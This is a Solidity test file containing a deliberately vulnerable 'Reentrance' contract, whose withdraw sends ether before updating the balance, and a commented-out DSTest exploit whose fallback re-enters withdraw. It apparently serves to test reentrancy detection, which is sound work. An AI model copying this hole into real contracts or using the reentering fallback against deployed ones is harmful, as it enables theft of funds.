// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "ds-test/test.sol";
// import "./Cheats.sol";

contract Reentrance {
  
  uint public balance;

  function donate(address _to) public payable {
    balance += (msg.value);
  }

  function withdraw(uint _amount) public {
    if(balance >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balance -= _amount;
    }
  }

  receive() external payable {}
}

/*
contract ReentrancyTest is DSTest {

    Cheats constant cheats = Cheats(HEVM_ADDRESS);
    uint default_value = 5; // using msg.value results in stack overflow

    Reentrance public targetContract;

    function setUp() public {
      targetContract = new Reentrance();
      address(targetContract).call{value:default_value}("");
    }

    function testExploit() public payable {
        cheats.monitorStorage(address(targetContract), 0);
        targetContract.donate{value:default_value}(address(this));
        targetContract.withdraw(default_value);
    }

    fallback() external payable {
        targetContract.withdraw(default_value);
    }

}
*/